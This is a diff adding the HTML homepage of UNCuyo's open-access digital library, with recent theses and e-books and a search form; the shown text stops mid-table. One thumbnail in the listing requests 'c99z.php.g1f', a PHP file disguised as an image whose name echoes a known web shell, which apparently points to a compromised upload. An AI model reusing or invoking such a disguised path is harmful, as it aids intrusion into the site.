@@ -1,0 +1,1181 @@
+<!DOCTYPE html><html lang="es">
+  <head>
+
+<title>Biblioteca Digital | Sistema Integrado de Documentaci&oacute;n | UNCuyo.</title>
+
+
+<meta HTTP-EQUIV="Content-type" CONTENT="text/html; charset=UTF-8">
+<meta name="keywords" content="Cultura Universidad Nacional de Cuyo Mendoza Argentina Educaci&oacute;n Revistas Cient&iacute;ficas Latinoam&eacute;rica Libros Digitales Acceso Abierto Open Access OAI PMH Biblioteca Digital Library tesis video audio proyectos de investigaci&oacute;n ">
+<meta name="description" content="">
+<meta name="verify-v1" content="V8rjNMKlVk9yIhIx6XEyZe8ctwhc11ESec1saLmzfH4=" >
+<link href="/moz-search-plugin.xml" title="Bdigital UNCuyo para Firefox" type="application/opensearchdescription+xml" rel="search" />
+<link type="application/opensearchdescription+xml" rel="search" href="/description.xml" title="Biblioteca Digital UNCuyo" />
+<meta property="og:site_name" content="Biblioteca Digital UNCUYO - Del Sistema Integrado de Documentación - UNCUYO" />
+<meta property="og:title" content="Biblioteca Digital UNCUYO - Del Sistema Integrado de Documentación - UNCUYO" />
+<meta property="og:description" content="Biblioteca Digital de la UNCuyo. Repositorio digital de la producci&oacute;n cient&iacute;fico acad&eacute;mica de la Universidad Nacional de Cuyo. Colecciones de Revistas, Audiovisuales, Archivos Sonoros, Tesis, Informes y Proyectos de Investigaci&oacute;n" />
+<meta property="og:url" content="/" />
+<!-- Meta Robots para determinar que será indexado por el buscador -->
+<meta name="robots" content="index,follow" />	
+<meta name="author" content="Desarrollo Web - SID Comunicación" />
+          
+   
+<link href="/css/contenido_new.css" rel="stylesheet" type="text/css">
+<link href="/css/960.css" rel="stylesheet" type="text/css">
+<link rel="shortcut icon" href="/plantillas/img/icon.ico" type="image/x-icon">
+<link rel="image_src" href="/img/banner.jpg" />
+
+          
+<script type='text/javascript' src='/js/jquery.min.js'></script>
+<script type='text/javascript' src='/js/qrcode.min.js'></script>
+<script type="text/javascript">
+ jQuery.noConflict();
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+    "@type": "Organization",
+      "url": "https://bdigital.uncu.edu.ar",
+        "logo": "/img/bd.jpg"
+        }
+        </script>
+        <script type="application/ld+json">
+        {
+          "@context": "http://schema.org",
+            "@type": "WebSite",
+              "url": "https://bdigital.uncu.edu.ar/",
+                "potentialAction": {
+                    "@type": "SearchAction",
+                        "target": "/buscador.php?op=simple&textosimple={search_term_string}&tipo=todos&tipo=textuales",
+                            "query-input": "required name=search_term_string"
+                              }
+                              }
+                              </script>
+
+
+</head>
+<body>
+
+
+
+<table border="0" cellspacing="0" cellpadding="0" width="100%" class="cabecera" align="center">
+  <tr>
+	<td width="52%" valign="top">
+		
+        <a href="/">
+        <img src="/img/bd2018.png" width="600" height="90" border="0" ></a>        </td>
+    <td align="left" valign="bottom">
+    <table  border="0" align="right" cellpadding="0" cellspacing="0">
+     
+
+      <tr>
+      
+        <td height="78" colspan="5" align="center" valign="top"><img src="/img/logo-sid.png" width="360" height="74" usemap="#Map" border="0"></td>
+      </tr>
+      <tr>
+        <td width="55" align="center" class="barra_top">
+        <a href="/">Home</a>        </td>
+        <td width="85" align="center" class="barra_top"><a href="/paginas/guia-de-uso.php"> Gu&iacute;a de uso</a> </td>
+        <td width="115" align="center" class="barra_top"> <a href="/paginas/publicar.php">¿C&oacute;mo Publicar?</a>  </td>
+        <td width="37" align="center" class="barra_top"> <a href="https://sid.uncu.edu.ar/" target="_blank" >SID</a> </td>
+        <td width="68" align="center" class="barra_top"> <a href="https://sid.uncu.edu.ar/contacto-biblioteca-digital/">Contacto</a></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+
+
+
+<table width="100%" cellspacing="0" cellpadding="0" border="0" height="100%">
+<tr>
+<td valign="top">
+    <table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr>
+            <td rowspan="3" align="left" valign="top" >
+            <!--<div id="info" style="margin-left:38px; margin-right:20px; margin-bottom:10px; float:left">
+                      <a href="/accesoabierto/"><img src="/accesoabierto/img/banner2012.jpg" width="480" height="165" style="margin-left:0px; margin-right:20px; float:left"></a>Conoc&eacute;  mucho más del Acceso Abierto <a href="/accesoabierto/"><strong>aqui</strong></a> &gt;
+                      <p>Inscribite a las Jornadas Virtuales de Acceso Abierto. Que se realizarán el                            <strong>1º de Noviembre</strong> en el CICUNC - UNCuyo.
+                        <strong>Inscripciones gratuitas </strong>en la página del <a href="http://accesoabierto2012.caicyt.gov.ar/" target="_blank"><strong>CAICyT</strong></a> &gt;<br>
+                      </p>
+              </div>-->
+                
+    
+                 
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+                              <tr >
+                                <td colspan="3" align="left" valign="bottom">                               </td>
+                              </tr>
+                              <tr >
+                                <td valign="bottom">&nbsp;</td>
+                                <td valign="bottom" align="center" >
+                                
+                               
+<table width="100%" border="0" align="center" cellpadding="10" cellspacing="0" class="intro-tabla">
+                                  <tr>
+                                    <td colspan="2" align="center" class="intro-tit" >REPOSITORIO INSTITUCIONAL EN ACCESO ABIERTO</td>
+                                  </tr>
+                                  <tr>
+                                    <!--<td width="61%" align="left" class="mainbanner_foto" >&nbsp;</td>-->
+                                    <td colspan="2" align="left" class="barra">
+                                    
+<table border="0" cellspacing="20" cellpadding="10" class="intro" width="100%" height="140">
+  <tr>
+    <td width="25%" align="center" valign="top"><img src="../css/img/home-docu.png" width="100" height="60" alt="BD"><br>
+      <strong>Recursos Digitales</strong><br>
+      para estudiantes, docentes e investigadores <br></td>
+    <td width="25%" align="center" valign="top"><img src="../css/img/home-pres.png" width="100" height="60" alt="BD"><br>
+      <strong>Preservaci&oacute;n</strong><br>
+      de los trabajos en formatos <br>
+      que garantizan su acceso en el tiempo </td>
+    <td width="25%" align="center" valign="top"><img src="../css/img/home-visi.png" width="100" height="60" alt="BD"><br>
+      <strong>Visibilidad</strong><br>
+      de nuestra producci&oacute;n cient&iacute;fica <br>
+      a nivel global </td>
+    <td width="25%" align="center" valign="top"><img src="../css/img/home-oa.png" width="100" height="60" alt="BD"><br>
+      <strong>Acceso Abierto</strong><br>
+      a miles de trabajos para descargar <br>
+      a texto completo</td>
+  </tr>
+</table></td>
+</tr>
+<tr>
+<td width="50%" align="left" class="barra" style="border-right: 1px solid #c6c6c6" ><p class="tit_bco"> Acced&eacute; libremente a los <strong>18469</strong> objetos digitales publicados</p></td>
+<td width="309" align="center"  >Conocé más sobre:<a href="/accesoabierto/"><img src="/img/cc-oa.jpg" alt="" width="208" height="47" align="absmiddle"></a></td>
+</tr>
+<tr>
+<td colspan="2" align="left" style="border-right: 1px solid #c6c6c6" >
+
+
+
+<!--<div class="noticia-home">
+<div class="noti-txt">
+
+
+
+</div>
+</div>-->
+
+
+
+
+
+</td>
+</tr>
+<tr>
+  <td colspan="2" align="center" style="border-right: 1px solid #c6c6c6; border-top: 1px solid #c6c6c6" ><strong><a href="/paginas/estadisticas.php" style="color:#FFF">Consulte las estadísticas del sitio <img src="../img/stats30.png" width="30" height="30" style="vertical-align:middle"></a></strong></td>
+</tr>
+</table>
+
+<div  style="margin:10px;">
+   <a class="" href="http://tinyurl.com/zm6pcrd" target="_blank"><img class="hover-brand" src="/img/19.gif" border="0" width="928" alt="banner línea de tiempo"></a>
+    
+     </div>
+
+</td>
+                                <td valign="bottom" >&nbsp;</td>
+                              </tr>
+                             
+                              <tr >
+                                <td valign="bottom">&nbsp;</td>
+                                <td valign="bottom" class="titu_ult">NOVEDADES</td>
+                                <td valign="bottom" >&nbsp;</td>
+              </tr>
+                              <tr>
+                                <td width="4%" align="left" valign="top" class="hoja_L"></td>
+                                
+                                <td width="94%" align="left" valign="top">
+								<br>
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21524/portada-1.jpg" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21524">Hidrología aplicada en la gestión hídrica</a>
+                    </h4>
+               <p>Por:<span class="autor">  </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21524">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21656/c99z.php.g1f" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21656">Memoria de gestión</a>
+                    <br>2022-2026</h4>
+               <p>Por:<span class="autor"> Sanchez, Lucía Esther </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21656">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21661/siip-memoriagestion2022-2026.jpg" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21661">De la visión a la transformación</a>
+                    <br>un cambio de paradigma : 2022 - 2026</h4>
+               <p>Por:<span class="autor"> Damiani, María Teresa </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21661">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21662">La batería en el tango, siglo XXI</a>
+                    </h4>
+               <p>Por:<span class="autor"> Martinez, Camilo Ernesto </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21662">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21663">Las políticas públicas a las artes visuales y el trabajo artístico y cultural en Mendoza en 2020-2021</a>
+                    </h4>
+               <p>Por:<span class="autor"> Zappettini, Verónica Florencia </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21663">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21651">Desarrollo de planta de elaboración de bebida fermentada de algarroba</a>
+                    </h4>
+               <p>Por:<span class="autor"> Sosa, Paula Janet </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21651">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21637">Directivas médicas anticipadas</a>
+                    </h4>
+               <p>Por:<span class="autor"> López, Marianela </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21637">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21634">Fracaso tardío de un tratamiento endodóntico regenerativo asociado a antecedente traumático</a>
+                    </h4>
+               <p>Por:<span class="autor"> Calcagno, María Agustina </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21634">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21613">La divergencia entre el dolo eventual y la culpa consciente</a>
+                    </h4>
+               <p>Por:<span class="autor"> Zúñiga, Juan Pablo </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21613">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21611">Hacia una educación médica innovadora</a>
+                    </h4>
+               <p>Por:<span class="autor"> Anzorena, Alejandra </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21611">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Tesis.png">-->
+          <span class="tipo_obj">Tesis</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+                    <h4><a href="/fichas.php?idobjeto=21610">Los desplazados de la Patria en A costa dos murmúrios y O vento assobiando nas gruas de Lídia Jorge</a>
+                    </h4>
+               <p>Por:<span class="autor"> Suarez, Adraiana Esther </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21610">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21487/uncuyoacademica-documentomarcosicu.jpg" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21487">Documento marco </a>
+                    <br>sinceramiento curricular de la UNCUYO : SICU</h4>
+               <p>Por:<span class="autor"> Aguirre, Julio Leonidas  </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21487">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21485/uncuyo-manualregu.jpg" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21485">Residuos Especiales de Generación Universal REGU</a>
+                    <br>manual para su gestión, almacenamiento y actuación</h4>
+               <p>Por:<span class="autor"> Universidad Nacional de Cuyo. Instituto de Ciencias ambientales. Programa Residuos </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21485">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+       <tr valign="top">
+         <td width="12" align="right"><img src="/css/img/ficha_topL.gif" width="12" height="22"></td>
+         <td colspan="2" valign="bottom" class="ficha_copete_result">
+          <!--<img src="/img/Libros Electrónicos.png">-->
+          <span class="tipo_obj">Libros Electrónicos</span></td>
+         <td><img src="/css/img/ficha_topR.gif" alt="" width="12" height="22"></td>
+       </tr>
+        <tr valign="top">
+          <td class="ficha_ladoL">&nbsp;</td>
+          
+          
+                <td class="ficha_cont">
+                    
+
+<div class="img-lista"> <img src="/include/thumb/phpThumb.php?w=120&src=/objetos_digitales/21374/1755192854-3e5e029a1d651326947e-900-540.jpeg" align="left" style="margin:0px 20px 0px 0px"/ class="tapa-listado"></div>
+
+
+                    <h4><a href="/fichas.php?idobjeto=21374">Estruendo mudo</a>
+                    <br>Elementos para la comprensión del texto lírico</h4>
+               <p>Por:<span class="autor"> Zonana, Víctor Gustavo </span> </p>
+                
+               </td>
+                <td width="122" align="right" class="ficha_cont"><p><a href="/fichas.php?idobjeto=21374">Ver Ficha</a> &gt;</p>
+                   
+
+</td>
+                <td width="12" class="ficha_ladoR">&nbsp;</td>
+        </tr>
+        <tr valign="top">
+          <td width="12" align="right"><img src="/css/img/ficha_botL.gif" alt="" width="12" height="13"></td>
+          <td colspan="2" class="ficha_bottom">&nbsp;</td>
+          <td class="td_result2"><img src="/css/img/ficha_botR.gif" alt="" width="12" height="13"></td>
+        </tr>
+          </table>
+   
+
+	                                
+    </td>
+     <td width="2%" align="left" valign="top" class="hoja_R">&nbsp;</td>
+     </tr>
+    </table>
+    </td>
+    
+    
+    
+    <td align="right" valign="top" class="barra">
+                
+   
+   
+
+
+   <br>
+   <div id="buscador_general">
+    <form action="/buscador.php" method="post" name="form_general">
+   <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+     <tr align="left" valign="top">
+       <td width="100%" align="left" valign="bottom" bgcolor="#4C6375" class="tit_tipoobjeto">BUSCAR</td>
+     </tr>
+    
+     <tr align="left" valign="top">
+       <td height="50" align="center" valign="middle" bgcolor="#4C6375" class="td_busca">
+      
+           <input name="op" value="simple" type="hidden"/>
+		   <input name="pag" value="1" type="hidden"/>
+           <input name="textosimple" type="text" class="PullDown" value="" size="30">
+           <input name="Submit" type="submit" class="boton-buscar" value="Buscar">
+           <br>
+            <span id="filtros" class="tags"><a href="/paginas/busqueda.php" style="color:white;">Opciones de b&uacute;squeda</a> <br>       
+              <br/><a href="/buscador/" style="font-size:12px ;font-weight: bold; color:white;">Buscador Avanzado</a>
+
+		  </span>		   </td>
+     </tr>
+   </table>
+   </form>
+   </div>
+
+   <div id="buscador_tipo" style="display:none;">
+    <!-- NAVEGADOR -->
+     <form action="/buscador.php" method="post" name="form_general">
+   <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+     <tr align="left" valign="top" >  
+       <td  width="100" align="left" valign="bottom" bgcolor="#4C6375" class="tit_tipoobjeto">BUSCAR</td>
+     </tr>
+     <tr align="left" valign="top">
+       <td height="30"  align="left" valign="bottom" bgcolor="#4C6375"><div id="barraselectora2" align="center">
+         <table width="95%" border="0" cellpadding="0" cellspacing="0">
+           <tr>
+             <td align="center" class="pest_busca">
+             <a href="#buscador_general" onclick="sbuscador_general();return false; ">B&uacute;squeda General</a></td>
+             <td>&nbsp;</td>
+             <td align="center" class="pest_busca_on">
+             </td>
+           </tr>
+         </table>
+       </div>
+       
+       
+       </td>
+     </tr>
+       </table>
+	     
+       <table width="95%" border="0" align="center" cellpadding="5" cellspacing="0" class="td_busca">
+         <tr align="left" valign="top">
+           <td height="30" colspan="3"  align="center" valign="bottom" bgcolor="#4C6375" class="navegar_td">
+        
+           <input name="op" value="poruncutipo" type="hidden"/>
+           <input name="pag" value="1" type="hidden"/>
+           <input name="textoportipo" type="text" class="PullDown" value="" size="30">           </td>
+         </tr>
+         <tr align="left" valign="top">
+           <td  height="29" align="left" valign="bottom" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_txt.jpg" width="70" height="19" onclick="marcar('t');"></td>
+           <td align="left" valign="bottom" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_vid.jpg" width="70" height="19" onclick="marcar('v');" ></td>
+           <td align="left" valign="bottom" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_aud.jpg" width="70" height="19" onclick="marcar('a');"></td>
+         </tr>
+         <tr align="left" valign="top">
